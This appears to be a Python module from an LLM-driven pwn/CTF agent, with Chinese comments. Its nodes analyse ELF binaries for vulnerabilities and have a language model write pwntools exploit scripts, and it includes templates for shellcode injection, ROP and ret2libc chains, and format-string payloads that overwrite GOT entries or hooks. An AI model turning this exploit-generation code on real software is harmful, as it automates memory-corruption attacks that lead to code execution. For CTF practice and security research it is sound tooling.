# pwn/nodes.py
"""
Pwn分析节点

节点:
- pwn_analyst_node: 二进制分析与漏洞检测
- pwn_exploiter_node: 利用构建与执行
"""

import json
from typing import Dict, List, Any
from llm_client import llm_client
from config import config
from logger import get_logger
from .tools import (
    BinaryAnalyzer,
    ProtectionChecker,
    ROPBuilder,
    ShellcodeGenerator,
    ExploitBuilder,
    BinaryInfo,
    VulnerabilityInfo
)

# 模块日志器
logger = get_logger("Pwn")


def pwn_analyst_node(state: Dict) -> Dict:
    """
    [Pwn分析节点] 分析二进制文件并检测漏洞

    输入:
        - binary_path: 二进制文件路径
        - pwn_mode: 是否处于Pwn模式

    输出:
        - binary_info: 二进制信息
        - vulnerabilities: 检测到的漏洞
        - pwn_analysis: 分析结果

    工作流程:
        1. 获取二进制文件路径
        2. 分析二进制信息
        3. 检测保护机制
        4. 查找潜在漏洞
    """
    logger.info("[PwnAnalyst] Starting binary analysis...")

    # 获取二进制路径
    binary_path = state.get("binary_path", "")

    # 尝试从已知事实中提取
    if not binary_path:
        known_facts = state.get("known_facts", "")
        # 查找可能的二进制路径
        import re
        path_match = re.search(r'(?:binary|file|executable)[:\s]+([^\s,]+)', known_facts, re.I)
        if path_match:
            binary_path = path_match.group(1)

    if not binary_path:
        # 尝试从附件中查找
        attachments = state.get("attachments", [])
        for att in attachments:
            if att.get("type") in ["elf", "pe", "binary"]:
                binary_path = att.get("path", "")
                break

    if not binary_path:
        logger.info("[PwnAnalyst] No binary path found")
        return {
            "pwn_analysis": {"status": "no_binary"},
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    try:
        # 分析二进制
        binary_info = BinaryAnalyzer.analyze(binary_path)

        # 检测漏洞
        vulnerabilities = BinaryAnalyzer.find_vulnerabilities(binary_info)

        # 转换为可序列化格式
        binary_info_dict = {
            "path": binary_info.path,
            "arch": binary_info.arch,
            "bits": binary_info.bits,
            "endian": binary_info.endian,
            "protections": binary_info.protections,
            "function_count": len(binary_info.functions),
            "dangerous_functions": [f for f in binary_info.functions
                                   if f in BinaryAnalyzer.DANGEROUS_FUNCTIONS],
            "has_gadgets": len(binary_info.gadgets) > 0,
            "interesting_strings": [s for s in binary_info.strings
                                   if any(kw in s.lower() for kw in ['flag', 'password', 'secret', 'key'])]
        }

        vulns_list = [{
            "type": v.vuln_type,
            "location": v.location,
            "severity": v.severity,
            "exploit_method": v.exploit_method
        } for v in vulnerabilities]

        # LLM深度分析
        llm_analysis = _llm_pwn_analysis(binary_info_dict, vulns_list, state)

        logger.info(f"[PwnAnalyst] Analysis complete: {binary_info.arch}, {len(vulns_list)} vulnerabilities found")

        return {
            "binary_info": binary_info_dict,
            "vulnerabilities": vulns_list,
            "pwn_analysis": {
                "status": "analyzed",
                "arch": binary_info.arch,
                "protections": binary_info.protections,
                "llm_insight": llm_analysis
            },
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    except FileNotFoundError as e:
        logger.info(f"[PwnAnalyst] Binary not found: {e}")
        return {
            "pwn_analysis": {"status": "error", "error": str(e)},
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
            "execution_steps": state.get("execution_steps", 0) + 1
        }
    except Exception as e:
        logger.warning(f"[PwnAnalyst] Analysis failed: {e}")
        return {
            "pwn_analysis": {"status": "error", "error": str(e)},
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
            "execution_steps": state.get("execution_steps", 0) + 1
        }


def pwn_exploiter_node(state: Dict) -> Dict:
    """
    [Pwn利用节点] 构建并执行exploit - AI驱动

    输入:
        - binary_info: 二进制信息
        - vulnerabilities: 漏洞列表

    输出:
        - exploit_script: 生成的exploit脚本
        - exploit_result: 执行结果

    工作流程:
        1. 选择目标漏洞
        2. AI生成exploit策略
        3. AI生成exploit脚本
        4. 尝试执行
    """
    logger.info("[PwnExploiter] Building exploit with AI...")

    binary_info_dict = state.get("binary_info", {})
    vulnerabilities = state.get("vulnerabilities", [])

    if not binary_info_dict or not vulnerabilities:
        return {
            "error": "No binary info or vulnerabilities available",
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    # 选择最高严重性的漏洞
    high_vulns = [v for v in vulnerabilities if v.get("severity") == "high"]
    target_vuln = high_vulns[0] if high_vulns else vulnerabilities[0]

    vuln_type = target_vuln.get("type", "unknown")
    arch = binary_info_dict.get("arch", "x64")
    protections = binary_info_dict.get("protections", {})

    # AI决策exploit策略
    exploit_strategy = _ai_decide_exploit_strategy(binary_info_dict, target_vuln, state)

    logger.info(f"[PwnExploiter] AI策略: {exploit_strategy.get('exploit_method', 'unknown')}")

    # AI生成exploit脚本
    if exploit_strategy.get("exploit_method") != "manual_required":
        script = _ai_generate_exploit_script(binary_info_dict, target_vuln, exploit_strategy)

        logger.info(f"[PwnExploiter] AI生成脚本 ({len(script)} bytes)")

        return {
            "exploit_script": script,
            "exploit_info": exploit_strategy,
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    logger.info(f"[PwnExploiter] 需要手动exploit: {exploit_strategy.get('reason', '')}")

    return {
        "exploit_info": exploit_strategy,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _build_buffer_overflow_exploit(binary_info: Dict, vuln: Dict,
                                    protections: Dict) -> Dict:
    """构建缓冲区溢出exploit"""
    arch = binary_info.get("arch", "x64")

    # 检查保护
    if protections.get("Canary"):
        return {
            "status": "blocked",
            "reason": "Stack canary enabled",
            "suggestion": "Need to leak canary or find canary bypass"
        }

    exploit_method = "unknown"
    shellcode = None
    rop_chain = None

    # NX保护决定策略
    if not protections.get("NX"):
        # 可以注入shellcode
        exploit_method = "shellcode_injection"
        shellcode = ShellcodeGenerator.get_shellcode(arch, "linux", "execve_binsh")
    else:
        # 需要ROP
        exploit_method = "rop_chain"

        # 重建BinaryInfo对象用于ROP构建
        class SimpleBinaryInfo:
            def __init__(self, info):
                self.gadgets = info.get("gadgets", [])
                self.strings = info.get("interesting_strings", [])

        rop_result = ROPBuilder.build_rop_chain(
            SimpleBinaryInfo(binary_info),
            target="execve",
            arch=arch
        )

        if rop_result.get("status") == "ready":
            rop_chain = rop_result
        else:
            # 尝试ret2libc
            exploit_method = "ret2libc"
            rop_chain = {
                "status": "need_addresses",
                "required": ["system", "/bin/sh"],
                "suggestion": "Leak libc address first"
            }

    return {
        "status": "ready",
        "exploit_method": exploit_method,
        "shellcode": shellcode.hex() if shellcode else None,
        "rop_chain": rop_chain,
        "offset_required": True,
        "note": "Need to calculate exact offset"
    }


def _build_format_string_exploit(binary_info: Dict, vuln: Dict) -> Dict:
    """构建格式化字符串exploit"""
    return {
        "status": "ready",
        "exploit_method": "format_string",
        "techniques": [
            "Leak stack data with %p",
            "Leak specific position with %{offset}$p",
            "Write with %n (need to find target address)"
        ],
        "common_payloads": [
            "%p" * 20,  # 泄露栈数据
            "%{offset}$s",  # 读取任意地址
            "%{n}c%{offset}$n"  # 写入任意地址
        ],
        "targets": [
            "__free_hook -> system",
            "__malloc_hook -> one_gadget",
            "GOT entry -> system"
        ],
        "note": "Need to find format string offset"
    }


def _build_heap_exploit(binary_info: Dict, vuln: Dict) -> Dict:
    """构建堆利用exploit"""
    return {
        "status": "partial",
        "exploit_method": "heap_exploitation",
        "techniques": [
            "Fastbin attack",
            "Unsorted bin attack",
            "Tcache poisoning",
            "House of Force",
            "House of Orange"
        ],
        "targets": [
            "__free_hook",
            "__malloc_hook",
            "GOT entries"
        ],
        "note": "Heap exploitation requires detailed heap layout analysis"
    }


def _generate_exploit_script(binary_info: Dict, exploit_info: Dict) -> str:
    """生成exploit脚本"""
    arch = binary_info.get("arch", "x64")
    binary_path = binary_info.get("path", "./binary")
    gadgets = binary_info.get("gadgets", [])
    protections = binary_info.get("protections", {})

    script = f'''#!/usr/bin/env python3
# Auto-generated PWN exploit script
from pwn import *

# Configuration
binary_path = "{binary_path}"
arch = "{arch}"

# Setup context
context(arch=arch, os='linux', log_level='debug')

# Load binary
elf = ELF(binary_path)

# Protections: {protections}

'''

    # 添加exploit特定代码
    method = exploit_info.get("exploit_method", "unknown")

    if method == "shellcode_injection":
        shellcode = exploit_info.get("shellcode", "")

        # 从gadgets中查找偏移提示
        offset_hint = exploit_info.get("offset", 0)
        if offset_hint == 0:
            offset_hint = exploit_info.get("buffer_size", 64) + 8

        script += f'''
# Shellcode
shellcode = bytes.fromhex("{shellcode}")

# Offset calculation
# Use cyclic pattern to find exact offset: cyclic(200), cyclic_find(core.pc)
offset = {offset_hint}  # Adjust based on analysis

# Build payload
payload = b'A' * offset
payload += shellcode

'''

    elif method == "rop_chain":
        rop = exploit_info.get("rop_chain", {})

        # 从gadgets中提取地址
        pop_rdi_addr = "0x0"
        pop_rsi_addr = "0x0"
        ret_addr = "0x0"

        for g in gadgets[:20]:  # 检查前20个gadget
            g_str = str(g).lower()
            if 'pop rdi' in g_str and 'ret' in g_str:
                # 提取地址: "0x1234: pop rdi; ret"
                parts = g.split(':')
                if parts:
                    pop_rdi_addr = parts[0].strip()
            elif 'pop rsi' in g_str and 'ret' in g_str:
                parts = g.split(':')
                if parts:
                    pop_rsi_addr = parts[0].strip()
            elif g_str.strip().endswith('ret') and 'pop' not in g_str:
                parts = g.split(':')
                if parts:
                    ret_addr = parts[0].strip()

        script += f'''
# ROP Chain
# Chain steps: {rop.get('chain_steps', [])}

# Gadgets found during analysis
pop_rdi = {pop_rdi_addr}  # pop rdi; ret
pop_rsi = {pop_rsi_addr}  # pop rsi; ret (if available)
ret_gadget = {ret_addr}   # ret (for stack alignment)

# Functions from binary
# Use: elf.symbols['system'] or elf.plt['system']
# Use: next(elf.search(b"/bin/sh\\x00")) for "/bin/sh" string

# Build ROP chain dynamically
rop = ROP(elf)

# Try to find addresses automatically
try:
    if 'system' in elf.symbols:
        system_addr = elf.symbols['system']
    elif 'system' in elf.plt:
        system_addr = elf.plt['system']
    else:
        system_addr = 0x0  # Manual: find in libc

    bin_sh = next(elf.search(b"/bin/sh\\x00"), 0x0)

    print(f"[*] system: {{hex(system_addr)}}")
    print(f"[*] /bin/sh: {{hex(bin_sh)}}")
except Exception as e:
    print(f"[!] Error finding addresses: {{e}}")

'''

    elif method == "format_string":
        fmt_offset = exploit_info.get("format_offset", 6)
        targets = exploit_info.get('targets', [])

        script += f'''
# Format String Exploitation
# Targets: {targets}

# Format string offset (found via testing with %p)
# Use: printf("AAAA%p.%p.%p...") to find offset
fmt_offset = {fmt_offset}

# Step 1: Leak addresses
# payload = f"%{{fmt_offset}}$p"  # Leak stack value

# Step 2: Write primitive
# To write 4 bytes to target_addr:
# payload = f"%{{value}}c%{{fmt_offset}}$n".encode()

# Example: Overwrite GOT entry
# target = elf.got['puts']  # Target address
# payload = fmtstr_payload(fmt_offset, {{target: new_value}})

'''

    script += '''
# Start process
p = process(binary_path)

# Send payload
# p.sendline(payload)

# Interactive shell
p.interactive()
'''

    return script


def _llm_pwn_analysis(binary_info: Dict, vulnerabilities: List[Dict],
                      state: Dict) -> str:
    """使用LLM进行深度Pwn分析"""

    prompt = f"""
Analyze this binary for exploitation opportunities.

## Binary Information
- Architecture: {binary_info.get('arch', 'unknown')}
- Bits: {binary_info.get('bits', 'unknown')}
- Protections: {binary_info.get('protections', {{}})}
- Dangerous Functions: {binary_info.get('dangerous_functions', [])}
- Has ROP Gadgets: {binary_info.get('has_gadgets', False)}

## Detected Vulnerabilities
{json.dumps(vulnerabilities, indent=2)}

## Interesting Strings
{binary_info.get('interesting_strings', [])}

## Task
1. Evaluate exploitability based on protections
2. Suggest exploitation strategy
3. Identify required gadgets or addresses
4. Estimate difficulty level

## Output Format (JSON)
{{
  "exploitable": true/false,
  "difficulty": "easy/medium/hard",
  "strategy": "recommended exploitation approach",
  "required_offsets": ["offsets to calculate"],
  "gadgets_needed": ["gadgets to find"],
  "script_template": "key exploit steps"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())
        return json.dumps(result, indent=2)

    except Exception as e:
        return f"LLM analysis failed: {str(e)}"


def _ai_decide_exploit_strategy(binary_info: Dict, vuln: Dict, state: Dict) -> Dict:
    """
    AI决策exploit策略

    根据二进制信息和漏洞特征，动态生成exploit策略
    """
    arch = binary_info.get("arch", "x64")
    protections = binary_info.get("protections", {})

    prompt = f"""
分析二进制漏洞，生成exploit策略。

## 二进制信息
- 架构: {arch}
- 保护: {json.dumps(protections, ensure_ascii=False)}
- 危险函数: {binary_info.get('dangerous_functions', [])}

## 漏洞信息
{json.dumps(vuln, ensure_ascii=False, indent=2)}

## 要求
1. 分析漏洞可利用性
2. 选择最佳exploit方法
3. 给出具体步骤

## 输出格式 (JSON)
{{
    "exploit_method": "shellcode_injection/rop_chain/ret2libc/format_string/heap_exploit",
    "status": "ready/blocked/manual_required",
    "reason": "选择理由",
    "steps": ["步骤1", "步骤2"],
    "required_addresses": ["需要的地址"],
    "payload_structure": "payload结构描述"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        result = json.loads(response.strip())
        logger.info(f"[AI Exploit策略] {result.get('exploit_method')} - {result.get('reason', '')}")
        return result

    except Exception as e:
        logger.warning(f"[AI Exploit策略] 失败: {e}")
        # 降级到硬编码策略
        if protections.get("Canary"):
            return {"exploit_method": "blocked", "status": "blocked", "reason": "Stack canary enabled"}
        return {"exploit_method": "rop_chain", "status": "ready", "reason": "降级默认"}


def _ai_generate_exploit_script(binary_info: Dict, vuln: Dict, strategy: Dict) -> str:
    """
    AI生成exploit脚本

    根据策略动态生成完整的exploit脚本
    """
    arch = binary_info.get("arch", "x64")
    binary_path = binary_info.get("path", "./binary")
    method = strategy.get("exploit_method", "unknown")

    prompt = f"""
生成PWN exploit脚本。

## 信息
- 二进制: {binary_path}
- 架构: {arch}
- 漏洞: {json.dumps(vuln, ensure_ascii=False)}
- 策略: {json.dumps(strategy, ensure_ascii=False)}

## 要求
1. 生成完整的Python exploit脚本
2. 使用pwntools库
3. 包含必要的注释
4. 考虑保护机制绕过

## 输出
只输出完整的Python脚本代码，不要其他解释。
"""

    try:
        script = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        ).strip()

        # 移除可能的markdown标记
        if script.startswith("```python"):
            script = script.split("```python")[1].split("```")[0]
        elif script.startswith("```"):
            script = script.split("```")[1].split("```")[0]

        return script.strip()

    except Exception as e:
        logger.warning(f"[AI脚本生成] 失败: {e}")
        # 降级到模板
        return _generate_exploit_script(binary_info, strategy)